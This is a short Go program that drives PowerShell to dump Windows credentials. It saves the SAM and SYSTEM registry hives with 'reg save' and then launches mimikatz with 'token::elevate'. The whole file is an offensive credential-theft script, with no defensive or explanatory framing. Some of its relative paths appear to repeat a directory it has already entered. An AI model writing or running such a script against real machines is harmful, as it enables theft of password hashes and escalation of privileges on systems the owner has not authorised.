package main

import (
	"fmt"
	ps "github.com/bhendo/go-powershell"
	"github.com/bhendo/go-powershell/backend"
	"os"
)

func main() {
	// choose a backend
	back := &backend.Local{}

	// start a local powershell process
	shell, err := ps.New(back)
	if err != nil {
		panic(err)
	}
	defer shell.Exit()
	err = os.Chdir("mimi/x64")
	if err != nil {
		panic(err)
		return
	}
	dir, _ := os.Getwd()
	fmt.Println("Dir", dir)
	stdout, stderr, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system.hiv")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println("error", stderr)
	fmt.Println(stdout)
	stdout, stderr, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam.hiv")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println("error", stderr)
	fmt.Println(stdout)
	dir, _ = os.Getwd()
	fmt.Println("Dir", dir)
	stdout, _, err = shell.Execute("cd mimi/x64 & .\\mimikatz & token::elevate")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println(stdout)
}
